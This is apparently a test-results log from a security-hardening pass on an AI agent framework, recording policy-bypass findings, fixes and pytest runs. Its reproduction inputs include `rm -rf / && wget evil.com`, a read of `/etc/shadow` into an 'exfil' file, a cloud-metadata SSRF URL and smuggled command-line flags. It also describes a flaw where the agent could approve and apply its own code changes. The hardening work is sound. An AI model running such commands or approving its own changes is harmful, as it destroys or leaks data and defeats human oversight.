# TEST_RESULTS

## Run: 2026-07-10 12:10 UTC — validation-harness overhaul, SR-1.9a (network policy allowlisted-host DNS-rebinding gap)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `NetworkPolicyEngine.check_host()`'s exact-hostname
  (`allowed_hosts`) and domain-suffix (`allowed_domains`) matches
  returned `allow` immediately with zero IP verification — the
  DNS-rebinding defense only ran for hostnames matching neither list.
  Two pre-existing tests
  (`test_exact_host_match_does_not_call_dns`,
  `test_domain_match_does_not_call_dns`) explicitly asserted this as
  correct — same "vulnerable behavior encoded as a passing test"
  pattern as SR-1.8.
- Live reproduction: with `allowed_hosts=["build.corp.example.com"]`
  and a fake resolver configured to raise `AssertionError` if ever
  invoked, `check_host("build.corp.example.com")` returned `True`
  **without the resolver ever being called**. Confirmed fixed: the same
  scenario with a resolver returning `10.0.0.5` now raises
  `PolicyViolationError` mentioning "rebinding".
- Fix: extracted the existing step-5 rebinding-check logic into a
  shared `_resolve_and_check_rebinding()` helper, applied uniformly to
  the name-match steps (3/4) as well as the no-match fallback (5). DNS
  resolution failure (`OSError`) still allows a name match through
  (nothing to rebind if there's no live DNS record).
- Command: `pytest tests/policy/test_network.py tests/policy/test_network_edges.py -q`
- Result: `192 passed` (6 tests rewritten in
  `TestShortCircuitBehaviour` — 2 renamed to reflect new behavior, 4 new)
- **Performance regression caught and fixed in the same checkpoint:**
  6 Hypothesis property tests in `tests/policy/test_policy_property.py`
  (`TestNetworkDomainMatching`, `TestNetworkAllowedHosts`) generate
  random hostnames as allowlist entries without mocking DNS — after
  this fix, each of up to 100 examples/test performed a real,
  unmocked `getaddrinfo()` call, pushing
  `tests/policy/+tests/gateway/+tests/security/` from 75.56s to
  382.66s (confirmed via direct pre/post timing comparison). Fixed by
  mocking DNS to raise `OSError` in those 6 tests (matching this same
  file's existing pattern for its deny-path tests). Re-verified:
  `tests/policy/+tests/gateway/+tests/security/` → `3040 passed in
  68.53s` (in line with the 75.56s baseline).
- **One additional real regression found and fixed via the full-suite
  run:** `tests/unit/test_policy_gateway_edges.py::TestPolicyHTTPClientEdgeCases::test_url_with_unusual_port_host_matched_by_allowed_hosts`
  used the literal hostname `"internal.corp.com"` as an `allowed_hosts`
  entry without mocking DNS; that hostname has a real DNS record
  resolving to `127.0.53.53` (ICANN's name-collision warning sentinel,
  a loopback address) in this sandbox — correctly triggering the new
  rebinding check as a genuine private/loopback address. Fixed by
  mocking DNS to fail for this test too, removing the unintended live
  DNS dependency (not weakening the test — it was never testing DNS
  behavior, only that unusual-port URLs match policy correctly).
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20806 passed, 13 skipped, 3 deselected in 466.52s (0:07:46)`
  — 4 more passing than the prior (SR-1.4) checkpoint's 20802, matching
  the net new tests added in `test_network_edges.py` (2 renamed +
  4 new); the mocking fixes in `test_policy_property.py` and
  `test_policy_gateway_edges.py` modified existing tests without adding
  new ones. Runtime back in line with prior checkpoints, confirming the
  performance regression was fully resolved before this run.

---

## Run: 2026-07-10 11:25 UTC — validation-harness overhaul, SR-1.4 (vision_capture/vision_burst filesystem permission mismatch)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `VisionCaptureTool` declared
  `ToolPermissions(filesystem_read=True, filesystem_write=True)` but
  reads its target from a `source` kwarg and writes to `save_path`
  (also reads `device`) — none of which match the registry's generic
  `path`/`file_path`/`target`/`destination` heuristic, so the declared
  permissions enforced nothing. Same architectural pattern as SR-1.5,
  in the tool the review names explicitly.
- Live reproduction (real registry+policy stack, not mocks): with
  nothing filesystem-allowlisted,
  `vision_capture(source="/etc/shadow", save_path="/tmp/exfil.jpg")`
  passed the registry's permission check with zero denial, and the tool
  actually called `cv2.imread("/etc/shadow")` — failed only because
  `/etc/shadow` isn't a valid image format, not because of any policy
  gate. Confirmed fixed: same call now denied with `"Filesystem read
  denied: '/etc/shadow' is not within an allowed read path"`.
- Fix: reused SR-1.5's `resolve_filesystem_targets()` hook (no new
  mechanism needed). `VisionCaptureTool` resolves `source` as a read
  target (unless a non-path sentinel like `"webcam"`), `device` as an
  additional read target, and `save_path` as the write target (falling
  back to the same fixed `~/.missy/captures/` default `execute()` uses
  when omitted). `VisionBurstCaptureTool` resolves `device` as a read
  target and only declares a write target when `best_only=True`,
  matching that its non-best-only branch never writes to disk.
- Command: `pytest tests/vision/ tests/tools/ tests/policy/ -q`
- Result: `5080 passed, 2 skipped` (3 known pre-existing
  `CameraDiscovery` cache-TTL failures, unrelated — same run also
  covers `tests/tools/`/`tests/policy/`, all passing); 14 new tests in
  `tests/vision/test_vision_tools.py`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20802 passed, 13 skipped, 3 deselected in 443.85s (0:07:23)`
  — 14 more passing than the prior (SR-1.6) checkpoint's 20788, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 10:55 UTC — validation-harness overhaul, SR-1.6 (Playwright bypassed the network gateway — crown-jewel finding)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `BrowserNavigateTool` called Playwright's `page.goto(url)`
  directly with zero routing through `PolicyHTTPClient` or the network
  policy engine, unlike every other network-permission tool
  (`web_fetch`, Discord upload) in the codebase. The registry itself had
  no dynamic host-checking mechanism for network permissions at all —
  only a static, always-empty `allowed_hosts` list.
- Live reproduction (real registry+policy stack, not mocks):
  `NetworkPolicy()` (nothing allowlisted) →
  `browser_navigate(url="http://169.254.169.254/latest/meta-data/")` —
  the cloud-metadata SSRF target the review names explicitly — **passed
  the registry's permission check** with zero denial, proceeding
  straight to Playwright (failed only for the unrelated pre-existing
  reason that this sandbox has no `playwright` package installed).
  Confirmed fixed: same call now denied with `"Network access denied:
  '169.254.169.254' is not in an allowed CIDR block"`.
- Fix (two layers): (1) `BaseTool.resolve_network_hosts()` hook (mirrors
  SR-1.5's `resolve_shell_command`/`resolve_filesystem_targets`
  pattern) — `BrowserNavigateTool` overrides it to extract the target
  host from `url`; the registry checks it before Playwright is ever
  touched. (2) `context.route("**/*", ...)` interception registered on
  every browser session, gating navigation, redirects, subresources,
  and JS-triggered `fetch()`/XHR (via `browser_evaluate`) against the
  same policy engine — the part of the review's finding ("every
  subresource/redirect/fetch inside Firefox is outside the Python
  gateway too") a top-level-only check would have missed.
- Command: `pytest tests/tools/test_browser_tools_gaps.py tests/tools/ tests/policy/ -q`
- Result: `2123 passed, 2 skipped` (18 new tests in
  `tests/tools/test_browser_tools_gaps.py` — see `AUDIT_SECURITY.md`'s
  `### SR-1.6` section for the full breakdown)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20788 passed, 13 skipped, 3 deselected in 446.47s (0:07:26)`
  — 18 more passing than the prior (SR-1.5) checkpoint's 20770, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 10:05 UTC — validation-harness overhaul, SR-1.5 (Incus declaration/dispatch mismatch)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `ToolRegistry._check_permissions()` derived the checked shell
  command from `kwargs.get("command", "shell")`; 14 of 15 Incus tools
  have no `command` kwarg (checked the meaningless literal `"shell"`
  instead of the real `incus` binary), and `incus_exec`'s `command`
  kwarg names the guest command, not the host binary. `incus_file`
  declared `shell=True` only, so its `host_path` was never checked
  against the filesystem policy.
- Live reproduction (real registry+policy+subprocess stack, not mocks):
  `ShellPolicy(enabled=True, allowed_commands=["bash"])` →
  `incus_exec(instance="victim-container", command="bash")` **passed
  policy** and executed `["incus", "exec", "victim-container", "--",
  "bash", "-c", "bash"]` on the host — `incus` was never allowlisted.
  Confirmed fixed: same call now denied with `"'incus' is not in the
  allowed commands list"`.
- Fix: added `BaseTool.resolve_shell_command()` /
  `resolve_filesystem_targets()` hooks; registry uses them when a tool
  overrides either, falling back to the exact prior heuristic otherwise
  (verified: zero behavior change for tools that don't opt in). All 15
  Incus tool classes declare the real host command (`"incus"`);
  `IncusFileTool` now declares filesystem permissions and resolves
  `host_path` to the correct read/write direction.
- Command: `pytest tests/tools/ tests/policy/ -q`
- Result: `2105 passed, 2 skipped` (15 new tests: 4 in
  `test_registry_hardening.py`, 11 in `test_incus_tools.py` — see
  `AUDIT_SECURITY.md`'s `### SR-1.5` section for the full breakdown)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20770 passed, 13 skipped, 3 deselected in 448.20s (0:07:28)`
  — 15 more passing than the prior (SR-1.8) checkpoint's 20755, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 09:10 UTC — validation-harness overhaul, SR-1.8 (shell default-deny — critical)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `ShellPolicyEngine.check_command()` treated an empty
  `allowed_commands` list as allow-all whenever `enabled=True` —
  directly contradicting `ShellPolicy`'s own docstring and all
  operator-facing docs, which already correctly promised deny-all. A
  pre-existing test literally asserted `rm -rf / && wget evil.com`
  passed policy under the default empty-allowlist config.
- Fix: `check_command()` now raises `PolicyViolationError` when
  `allowed_commands` is empty.
- Command: `pytest tests/policy/ tests/unit/test_shell_policy_compound_commands.py tests/integration/test_policy_enforcement.py tests/integration/test_end_to_end.py -q`
- Result: `815 passed` (4 pre-existing tests fixed from asserting the
  vulnerable behavior to asserting the correct fail-closed behavior; 1
  new test added)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20755 passed, 13 skipped, 3 deselected in 460.03s (0:07:40)`
  — no other hidden dependencies on the old behavior found anywhere in
  the codebase.

---

## Run: 2026-07-10 08:40 UTC — validation-harness overhaul, FX-G (bound/decompose long acpx work)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added `_MAX_TIMEOUT_SECONDS = 600` hard ceiling on configured acpx
  timeout, with a warning log when clamped. Improved the timeout
  `ProviderError` message to state the outcome is UNKNOWN and instruct
  fresh verification + idempotent retries.
- Attempted a `Popen`-based process-group-kill rewrite of `_run_acpx`/
  `stream()` for FX-G bullet 2's subprocess-cleanup ask; reverted after
  confirming (via a hung/background test run, killed manually) that it
  broke ~136 existing tests mocking `subprocess.run`. Tracked as task
  #17 for a dedicated future session with the necessary test migration.
- Command: `pytest tests/providers/test_acpx_provider.py -q` (with a
  hard 60s wall-clock guard to catch any subprocess-mock regression
  immediately)
- Result: `141 passed in 0.88s` (was 137 before this checkpoint)
- Command: `pytest tests/providers/ -q`
- Result: `890 passed in 24.93s`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20754 passed, 13 skipped, 3 deselected in 447.40s (0:07:27)`

---

## Run: 2026-07-10 08:10 UTC — validation-harness overhaul, FX-F bullet 1 (browser diagnostics)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added `_classify_browser_error()` in
  `missy/tools/builtin/browser_tools.py` distinguishing missing
  playwright, browser-binary-not-installed, and sandbox/kernel launch
  failure (the harness's exact two observed error strings) from generic
  interaction errors. Remediation text explicitly forbids
  `--no-sandbox`/`SYS_ADMIN`/privileged containers.
- Command: `pytest tests/tools/test_browser_tools_gaps.py tests/unit/test_browser_session_id_validation.py -q`
- Result: `37 passed`
- Command: `pytest tests/tools/ -q`
- Result: `1470 passed, 2 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20750 passed, 13 skipped, 3 deselected in 447.53s (0:07:27)`
- Live-verified: this dev sandbox has no `playwright` package installed
  and cannot launch a real browser — same environment limitation the
  validation harness observed. `_classify_browser_error()` correctly
  returns the specific install-guidance message rather than a generic
  failure.
- FX-F bullets 2/4 (disposable browser-test environment, WB-002..007 +
  XT-001 rerun) deferred as real infrastructure work — tracked as
  task #16.

---

## Run: 2026-07-10 07:40 UTC — validation-harness overhaul, FX-C (grounding factual state claims)

- Branch: `overhaul/missy-validation-20260710-031406`
- Memory ID lookups: added exception-vs-not-found distinction in
  `memory_describe`/`memory_expand` (4 call sites).
- Incus tools: confirmed and locked in with tests that `incus_list`/
  `incus_network(list)` are exact deterministic JSON passthroughs (no
  tool-layer fabrication possible).
- Added envelope rule 6 (`missy/providers/acpx_provider.py`) forbidding
  the delegate from padding/altering structured tool results.
- Command: `pytest tests/tools/ tests/memory/ -q`
- Result: `2059 passed, 9 skipped`
- Command: `pytest tests/providers/test_acpx_provider.py -q`
- Result: `137 passed`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20742 passed, 13 skipped, 3 deselected in 448.39s (0:07:28)`
- New tests: 10 in `tests/tools/test_incus_tools.py`
  (`TestIncusListExactRowPreservation`,
  `TestIncusNetworkListExactRowPreservation`), 8 in
  `tests/tools/test_memory_tools.py`
  (`TestMemoryDescribeExceptionVsNotFound`,
  `TestMemoryExpandExceptionVsNotFound`), 1 in
  `tests/providers/test_acpx_provider.py`.

---

## Run: 2026-07-10 07:00 UTC — validation-harness overhaul, SR-1.13 (Discord ingress authorization, 2 critical findings)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding 1: `_handle_message()` dispatched voice/image/screencast
  commands before DM/guild authorization ran.
- Finding 2 (more severe): `_handle_interaction()` (slash commands) had
  no authorization check at all, plus `_handle_ask()` hardcoded a
  shared `session_id="discord"` across all users.
- Command: `pytest tests/channels/ -q`
- Result: `1931 passed` (was 1925 before finding 1's fix, 1915 before
  this session's SR-1.12 fix)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20727 passed, 13 skipped, 3 deselected in 450.43s (0:07:30)`
- New tests: 11 in
  `tests/channels/test_discord_channel_gap_coverage.py::TestUniformIngressAuthorizationSR113`,
  6 in
  `tests/channels/test_discord_channel_coverage.py::TestHandleInteractionAuthorizationSR113`,
  8 in `tests/unit/test_discord_commands_coverage.py` (author-ID
  extraction + per-user session isolation).

---

## Run: 2026-07-10 06:00 UTC — validation-harness overhaul, FX-D (structural boundary + fail-closed)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added explicit `_CURRENT_TURN_BOUNDARY` marker line inserted by
  `_build_prompt()` before the final message; `complete()`/
  `complete_with_tools()` now raise `ProviderError` instead of silently
  returning an empty response when a leaked transcript marker strips
  away the entire delegate output.
- Command: `pytest tests/providers/test_acpx_provider.py -q`
- Result: `136 passed` (was 120 before this checkpoint; +16 net new
  tests across boundary placement/tracking, quoted-text safety,
  multiline/long-history, malicious-history-instruction confinement,
  DISC-CMD-006 + report-followup end-to-end with both defenses active,
  and fail-closed/partial-leak behavior)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20703 passed, 13 skipped, 3 deselected in 456.40s (0:07:36)`

---

## Run: 2026-07-10 05:10 UTC — validation-harness overhaul, FX-E + SR-1.2/1.3 (critical)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: live, unauthenticated code-self-approval vulnerability.
  Default system prompt instructed the agent to approve/apply its own
  code changes via `code_evolve`; `CodeEvolutionManager.approve()`/
  `apply()`/`rollback()` perform no authentication. A second,
  independent instance existed in Discord's ✅ reaction handler (any
  Discord user could approve, no admin check).
- Command: `pytest tests/tools/ tests/agent/ tests/channels/ tests/security/ -q`
- Result: `9530 passed, 6 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20686 passed, 13 skipped, 3 deselected in 447.60s (0:07:27)`
- Updated ~15 tests across `tests/tools/test_code_evolve.py`,
  `tests/tools/test_code_evolve_gap_coverage.py`,
  `tests/security/test_self_create_tool_script_validation.py`, and
  `tests/channels/test_discord_evolution_reactions.py` from the old
  (now-removed) tool-level approve/apply/rollback behavior to the new
  refusal contract. New assertions confirm `CodeEvolutionManager` is
  never constructed by the tool for approve/apply/rollback, and that
  Discord's approve-reaction path emits a `deny` audit event without
  ever calling `mgr.approve()`.

---

## Run: 2026-07-10 04:20 UTC — validation-harness overhaul, FX-B (memory backend fix)

- Branch: `overhaul/missy-validation-20260710-031406`
- Root cause: `AgentRuntime._make_memory_store()` returned the JSON
  `MemoryStore` (`~/.missy/memory.json`) instead of `SQLiteMemoryStore`
  (`~/.missy/memory.db`), which every other production consumer already
  assumed. Same bug independently present in
  `VisionMemoryBridge.store_observation()`.
- Command: `pytest tests/integration/test_discord_memory_persistence.py tests/agent/test_coverage_gaps.py tests/vision/ -q`
- Result: `3041 passed`, 3 failed (pre-existing `CameraDiscovery`
  cache-TTL bug, unrelated, tracked separately)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing failures deselected
- Result: `20701 passed, 13 skipped, 3 deselected in 452.13s (0:07:32)`
- New test file: `tests/integration/test_discord_memory_persistence.py`
  (8 tests) — real on-disk `SQLiteMemoryStore`, no memory-layer mocking,
  drives `AgentRuntime.run()` the same way Discord's channel handler
  does. Covers basic persistence, retrieval via
  `get_recent_turns`/`get_session_turns`/`search`, restart/resume across
  a fresh runtime instance on the same db file, concurrent multi-channel
  isolation, failed-provider-call behavior, and session-id derivation.
- ~30 pre-existing test assertions across 8 vision test files and
  `tests/agent/test_coverage_gaps.py` updated from the old (incorrect)
  kwargs-call assertion pattern to the real object-based
  `SQLiteMemoryStore.add_turn(turn)` contract — those assertions
  previously passed only because they mocked `add_turn` with a bare
  `MagicMock()` that silently accepted any call shape, which is exactly
  how the underlying persistence bug shipped undetected.

---

## Run: 2026-07-10 03:xx UTC — validation-harness overhaul, FX-A slice 1

- Branch: `overhaul/missy-validation-20260710-031406`
- Command: `pytest tests/channels/discord/test_voice_commands.py tests/providers/test_acpx_provider.py -q`
- Result: `157 passed`
- Command: `pytest tests/providers/ tests/agent/ -q`
- Result: `4995 passed, 4 skipped in 78.27s`
- Command: `pytest -q -o faulthandler_timeout=120` (full suite)
- Result: `20692 passed, 3 failed, 13 skipped in 490.29s (0:08:10)`
  - Failures: `tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl`,
    `tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped`,
    `tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl`.
    Confirmed pre-existing via `git stash` (fail identically on the
    pre-session tree); `CameraDiscovery` cache-TTL logic bug, unrelated
    to acpx/voice changes. Not fixed this session — tracked as a
    follow-up so this checkpoint's commits stay scoped.
- `ruff check` / `ruff format --check` on touched files: all clean.
- Live smoke test against the real installed `acpx@0.3.1` binary
  (`--version`/`--help` only, no LLM calls): `is_available() == True`,
  isolated sandbox cwd created at `~/.missy/acpx_sandbox` (mode 0700).
  Constructed argv verified with a hostile
  `base_url="--approve-all --cwd /evil --verbose"` config: only
  `--verbose` reached the subprocess; forced `--allowed-tools ""` /
  `--non-interactive-permissions deny` / `--cwd
  ~/.missy/acpx_sandbox` were present and last-wins.

**Baseline preserved below.** The 2026-07-09/10 validation-harness run
found 43/89 tool-specific validation cases failing (see `~/fixes.md`,
`BUILD_STATUS.md`); this run does not yet re-exercise that harness
(requires live delegate invocation) — it is unit/integration coverage
for the FX-A code change only.

---

## Run: 2026-07-09 15:28:21 (prior workstream: tool intelligence overhaul)

- Timestamp: 2026-07-09 15:28:21
- Command: pytest -q

```
........................................................................ [  0%]
........................................................................ [  0%]
........................................................................ [  1%]
........................................................................ [  1%]
........................................................................ [  1%]
........................................................................ [  2%]
........................................................................ [  2%]
........................................................................ [  2%]
........................................................................ [  3%]
........................................................................ [  3%]
........................................................................ [  3%]
........................................................................ [  4%]
........................................................................ [  4%]
........................................................................ [  4%]
........................................................................ [  5%]
........................................................................ [  5%]
........................................................................ [  5%]
........................................................................ [  6%]
........................................................................ [  6%]
........................................................................ [  6%]
........................................................................ [  7%]
........................................................................ [  7%]
........................................................................ [  8%]
........................................................................ [  8%]
........................................................................ [  8%]
........................................................................ [  9%]
........................................................................ [  9%]
........................................................................ [  9%]
........................................................................ [ 10%]
........................................................................ [ 10%]
........................................................................ [ 10%]
........................................................................ [ 11%]
........................................................................ [ 11%]
........................................................................ [ 11%]
........................................................................ [ 12%]
........................................................................ [ 12%]
........................................................................ [ 12%]
........................................................................ [ 13%]
........................................................................ [ 13%]
........................................................................ [ 13%]
........................................................................ [ 14%]
........................................................................ [ 14%]
........................................................................ [ 14%]
........................................................................ [ 15%]
........................................................................ [ 15%]
........................................................................ [ 16%]
............................................................ssss........ [ 16%]
........................................................................ [ 16%]
........................................................................ [ 17%]
........................................................................ [ 17%]
........................................................................ [ 17%]
........................................................................ [ 18%]
........................................................................ [ 18%]
........................................................................ [ 18%]
........................................................................ [ 19%]
........................................................................ [ 19%]
........................................................................ [ 19%]
........................................................................ [ 20%]
........................................................................ [ 20%]
........................................................................ [ 20%]
........................................................................ [ 21%]
........................................................................ [ 21%]
........................................................................ [ 21%]
........................................................................ [ 22%]
........................................................................ [ 22%]
........................................................................ [ 22%]
........................................................................ [ 23%]
........................................................................ [ 23%]
........................................................................ [ 24%]
........................................................................ [ 24%]
........................................................................ [ 24%]
........................................................................ [ 25%]
........................................................................ [ 25%]
........................................................................ [ 25%]
........................................................................ [ 26%]
........................................................................ [ 26%]
........................................................................ [ 26%]
........................................................................ [ 27%]
........................................................................ [ 27%]
........................................................................ [ 27%]
........................................................................ [ 28%]
........................................................................ [ 28%]
........................................................................ [ 28%]
........................................................................ [ 29%]
........................................................................ [ 29%]
........................................................................ [ 29%]
........................................................................ [ 30%]
........................................................................ [ 30%]
........................................................................ [ 31%]
........................................................................ [ 31%]
........................................................................ [ 31%]
........................................................................ [ 32%]
........................................................................ [ 32%]
........................................................................ [ 32%]
........................................................................ [ 33%]
........................................................................ [ 33%]
........................................................................ [ 33%]
........................................................................ [ 34%]
........................................................................ [ 34%]
........................................................................ [ 34%]
........................................................................ [ 35%]
........................................................................ [ 35%]
........................................................................ [ 35%]
........................................................................ [ 36%]
........................................................................ [ 36%]
........................................................................ [ 36%]
........................................................................ [ 37%]
........................................................................ [ 37%]
........................................................................ [ 37%]
........................................................................ [ 38%]
........................................................................ [ 38%]
........................................................................ [ 39%]
........................................................................ [ 39%]
........................................................................ [ 39%]
........................................................................ [ 40%]
........................................................................ [ 40%]
........................................................................ [ 40%]
........................................................................ [ 41%]
........................................................................ [ 41%]
........................................................................ [ 41%]
........................................................................ [ 42%]
........................................................................ [ 42%]
........................................................................ [ 42%]
........................................................................ [ 43%]
........................................................................ [ 43%]
........................................................................ [ 43%]
........................................................................ [ 44%]
........................................................................ [ 44%]
........................................................................ [ 44%]
........................................................................ [ 45%]
........................................................................ [ 45%]
........................................................................ [ 45%]
........................................................................ [ 46%]
........................................................................ [ 46%]
........................................................................ [ 47%]
...................................................sssssss.............. [ 47%]
........................................................................ [ 47%]
........................................................................ [ 48%]
........................................................................ [ 48%]
........................................................................ [ 48%]
........................................................................ [ 49%]
........................................................................ [ 49%]
........................................................................ [ 49%]
........................................................................ [ 50%]
........................................................................ [ 50%]
........................................................................ [ 50%]
........................................................................ [ 51%]
........................................................................ [ 51%]
........................................................................ [ 51%]
........................................................................ [ 52%]
........................................................................ [ 52%]
........................................................................ [ 52%]
........................................................................ [ 53%]
........................................................................ [ 53%]
........................................................................ [ 53%]
........................................................................ [ 54%]
........................................................................ [ 54%]
........................................................................ [ 55%]
........................................................................ [ 55%]
........................................................................ [ 55%]
........................................................................ [ 56%]
........................................................................ [ 56%]
........................................................................ [ 56%]
........................................................................ [ 57%]
........................................................................ [ 57%]
........................................................................ [ 57%]
........................................................................ [ 58%]
........................................................................ [ 58%]
........................................................................ [ 58%]
........................................................................ [ 59%]
........................................................................ [ 59%]
........................................................................ [ 59%]
........................................................................ [ 60%]
........................................................................ [ 60%]
........................................................................ [ 60%]
........................................................................ [ 61%]
........................................................................ [ 61%]
........................................................................ [ 62%]
........................................................................ [ 62%]
........................................................................ [ 62%]
........................................................................ [ 63%]
........................................................................ [ 63%]
........................................................................ [ 63%]
........................................................................ [ 64%]
........................................................................ [ 64%]
........................................................................ [ 64%]
........................................................................ [ 65%]
........................................................................ [ 65%]
........................................................................ [ 65%]
........................................................................ [ 66%]
........................................................................ [ 66%]
........................................................................ [ 66%]
........................................................................ [ 67%]
........................................................................ [ 67%]
........................................................................ [ 67%]
........................................................................ [ 68%]
........................................................................ [ 68%]
........................................................................ [ 68%]
........................................................................ [ 69%]
........................................................................ [ 69%]
........................................................................ [ 70%]
........................................................................ [ 70%]
........................................................................ [ 70%]
...............................................................ss....... [ 71%]
........................................................................ [ 71%]
........................................................................ [ 71%]
........................................................................ [ 72%]
........................................................................ [ 72%]
........................................................................ [ 72%]
........................................................................ [ 73%]
........................................................................ [ 73%]
........................................................................ [ 73%]
........................................................................ [ 74%]
........................................................................ [ 74%]
........................................................................ [ 74%]
........................................................................ [ 75%]
........................................................................ [ 75%]
........................................................................ [ 75%]
........................................................................ [ 76%]
........................................................................ [ 76%]
........................................................................ [ 76%]
........................................................................ [ 77%]
........................................................................ [ 77%]
........................................................................ [ 78%]
........................................................................ [ 78%]
........................................................................ [ 78%]
........................................................................ [ 79%]
........................................................................ [ 79%]
........................................................................ [ 79%]
........................................................................ [ 80%]
........................................................................ [ 80%]
........................................................................ [ 80%]
........................................................................ [ 81%]
........................................................................ [ 81%]
........................................................................ [ 81%]
........................................................................ [ 82%]
........................................................................ [ 82%]
........................................................................ [ 82%]
........................................................................ [ 83%]
........................................................................ [ 83%]
........................................................................ [ 83%]
........................................................................ [ 84%]
........................................................................ [ 84%]
........................................................................ [ 84%]
........................................................................ [ 85%]
........................................................................ [ 85%]
........................................................................ [ 86%]
........................................................................ [ 86%]
........................................................................ [ 86%]
........................................................................ [ 87%]
........................................................................ [ 87%]
........................................................................ [ 87%]
........................................................................ [ 88%]
........................................................................ [ 88%]
........................................................................ [ 88%]
........................................................................ [ 89%]
........................................................................ [ 89%]
........................................................................ [ 89%]
........................................................................ [ 90%]
........................................................................ [ 90%]
........................................................................ [ 90%]
........................................................................ [ 91%]
........................................................................ [ 91%]
........................................................................ [ 91%]
........................................................................ [ 92%]
........................................................................ [ 92%]
........................................................................ [ 93%]
........................................................................ [ 93%]
........................................................................ [ 93%]
........................................................................ [ 94%]
........................................................................ [ 94%]
........................................................................ [ 94%]
........................................................................ [ 95%]
........................................................................ [ 95%]
........................................................................ [ 95%]
........................................................................ [ 96%]
........................................................................ [ 96%]
........................................................................ [ 96%]
........................................................................ [ 97%]
........................................................................ [ 97%]
........................................................................ [ 97%]
........................................................................ [ 98%]
........................................................................ [ 98%]
........................................................................ [ 98%]
........................................................................ [ 99%]
........................................................................ [ 99%]
........................................................................ [ 99%]
.....                                                                    [100%]
20656 passed, 13 skipped in 421.70s (0:07:01)
```
